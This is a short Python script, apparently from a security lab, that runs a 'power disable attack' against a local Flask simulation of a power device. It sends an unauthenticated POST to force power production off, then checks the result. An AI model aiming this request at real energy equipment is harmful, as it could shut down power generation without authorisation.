import requests
from utils.logger import log_message

TARGET = "http://localhost:5000"  # URL of the Flask sim

DEVICE_ID = "603980032"  # Mocked Device ID

def run_power_disable_attack():
    log_message('[*] Running power disable attack...', "INFO")

    # Attempt to disable power production via unauthenticated access
    resp = requests.post(f"{TARGET}/ivp/mod/{DEVICE_ID}/mode/power", json={"powerForcedOff": True})
    if resp.status_code == 200:
        log_message("[+] Power production disabled successfully.", "INFO")
    else:
        log_message(f"[-] Failed to disable power production: {resp.json()}", "ERROR")

    # Verify that the power state was changed
    resp = requests.get(f"{TARGET}/ivp/mod/{DEVICE_ID}/mode/power")
    log_message(f"[*] Current power state: {resp.json()}", "INFO")
